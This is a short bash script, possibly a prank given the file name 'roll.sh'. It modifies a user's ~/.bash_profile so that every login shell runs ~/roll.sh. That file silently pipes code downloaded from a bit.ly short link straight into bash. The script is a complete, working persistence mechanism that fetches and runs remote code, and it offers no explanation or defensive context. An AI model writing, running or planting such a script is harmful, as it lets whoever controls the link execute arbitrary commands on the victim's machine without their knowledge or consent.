file1=.bash_profile
file2=roll.sh

cd ~

if [ ! -f $file1 ]
then
		touch $file1
fi

if [ ! -f $file2 ]
then
		touch $file2
fi

echo "curl -s -L http://bit.ly/10hA8iC | bash">>$file2
echo "source ~/roll.sh">>$file1
